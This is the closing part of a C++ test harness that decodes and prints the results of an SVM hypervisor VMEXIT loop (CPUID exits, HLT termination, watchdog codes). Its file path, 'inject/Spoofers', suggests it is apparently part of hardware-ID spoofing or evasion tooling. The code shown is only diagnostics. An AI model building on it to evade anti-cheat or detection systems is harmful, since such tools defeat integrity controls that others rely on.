  // Parse result
  uint32_t ret = (uint32_t)result;
  uint32_t cpuidCount = ret & 0xFFFF;
  uint32_t termCode = (ret >> 16) & 0xFF;
  uint32_t exitReason = (ret >> 24) & 0xFF;

  printf("=== V6.3 Results ===\n");
  printf("[*] Raw return: 0x%08X\n", ret);
  printf("[*] Exit reason: 0x%02X", exitReason);
  if (exitReason == 0x72)
    printf(" (CPUID)");
  else if (exitReason == 0x78)
    printf(" (HLT)");
  printf("\n");

  printf("[*] Termination: ");
  switch (termCode) {
  case 0:
    printf("OK (normal)\n");
    break;
  case 1:
    printf("HLT (clean exit)\n");
    break;
  case 2:
    printf("WATCHDOG (too many exits)\n");
    break;
  case 3:
    printf("BAD_RIP (guest RIP out of bounds)\n");
    break;
  case 4:
    printf("UNKNOWN (unhandled exit)\n");
    break;
  default:
    printf("? (%d)\n", termCode);
    break;
  }

  printf("[*] CPUID count: %d\n", cpuidCount);

  if (cpuidCount >= 5 && termCode == 1) {
    printf("\n");
    printf("=============================================\n");
    printf("  [+] SUCCESS! V6.3 VMEXIT LOOP WORKS!      \n");
    printf("  [+] Real hypervisor loop structure!       \n");
    printf("  [+] Exit-driven dispatch working!         \n");
    printf("  [+] Clean HLT termination!                \n");
    printf("=============================================\n");
  } else if (cpuidCount >= 1) {
    printf("\n[+] Partial success: %d CPUIDs handled\n", cpuidCount);
  }

  CloseHandle(hDevice);
  return 0;
}
ох20file:///c:/inject/Spoofers/SVMHypervisorV6_3.cpp